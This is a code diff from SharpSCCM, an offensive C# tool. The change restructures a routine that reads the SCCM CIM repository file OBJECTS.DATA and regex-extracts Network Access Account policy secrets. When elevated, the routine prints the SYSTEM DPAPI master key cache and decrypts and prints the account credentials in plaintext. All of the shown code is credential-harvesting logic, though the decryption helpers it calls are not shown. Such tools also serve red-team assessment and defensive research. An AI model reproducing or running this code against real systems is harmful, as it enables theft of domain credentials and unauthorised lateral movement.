@@ -28,53 +28,56 @@ namespace SharpSCCM
                 {
                     fileData = sr.ReadToEnd();
                 }
-            }
 
+                Regex regexData = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
+                var matchesData = regexData.Matches(fileData);
 
-            Regex regexData = new Regex(@"CCM_NetworkAccessAccount.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>.*<PolicySecret Version=""1""><!\[CDATA\[(.*)\]\]><\/PolicySecret>", RegexOptions.Multiline | RegexOptions.IgnoreCase | RegexOptions.Compiled);
-            var matchesData = regexData.Matches(fileData);
-
-            if (matchesData.Count <= 0)
-            {
-                Console.WriteLine("\r\n[X] No \"NetworkAccessAccount\" match found.");
-            }
-
-            if (Helpers.IsHighIntegrity())
-            {
-
-                Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
-
-                Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
-                foreach (KeyValuePair<string, string> kvp in mappings)
+                if (matchesData.Count <= 0)
                 {
-                    Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+                    Console.WriteLine("\r\n[X] No \"NetworkAccessAccount\" match found.");
                 }
 
-                for (int index = 0; index < matchesData.Count; index++)
+                if (Helpers.IsHighIntegrity())
                 {
 
-                    for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
+                    Dictionary<string, string> mappings = Dpapi.TriageSystemMasterKeys();
+
+                    Console.WriteLine("\r\n[*] SYSTEM master key cache:\r\n");
+                    foreach (KeyValuePair<string, string> kvp in mappings)
                     {
-                        try
+                        Console.WriteLine("{0}:{1}", kvp.Key, kvp.Value);
+                    }
+
+                    for (int index = 0; index < matchesData.Count; index++)
+                    {
+
+                        for (int idxGroup = 1; idxGroup < matchesData[index].Groups.Count; idxGroup++)
                         {
-                            string naaPlaintext = "";
-                            Console.WriteLine(
-                                "\r\n[*] Triaging SCCM Network Access Account Credentials from CIM Repository\r\n");
-                            naaPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, mappings);
-                            Console.WriteLine("     Plaintext NAA   : {0}", naaPlaintext);
-                            Console.WriteLine();
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine("[!] Data was not decrypted. An error occurred.");
-                            Console.WriteLine(e.ToString());
+                            try
+                            {
+                                string naaPlaintext = "";
+                                Console.WriteLine(
+                                    "\r\n[*] Triaging SCCM Network Access Account Credentials from CIM Repository\r\n");
+                                naaPlaintext = Dpapi.Execute(matchesData[index].Groups[idxGroup].Value, mappings);
+                                Console.WriteLine("     Plaintext NAA   : {0}", naaPlaintext);
+                                Console.WriteLine();
+                            }
+                            catch (Exception e)
+                            {
+                                Console.WriteLine("[!] Data was not decrypted. An error occurred.");
+                                Console.WriteLine(e.ToString());
+                            }
                         }
                     }
+                }
+                else
+                {
+                    Console.WriteLine("\r\n[X] You must be elevated to retrieve masterkeys.\r\n");
                 }
             }
             else
             {
-                Console.WriteLine("\r\n[X] You must be elevated to retrieve masterkeys.\r\n");
+                Console.WriteLine("\r\n[X] OBJECTS.DATA does not exist or is not readable.\r\n");
             }
         }
 
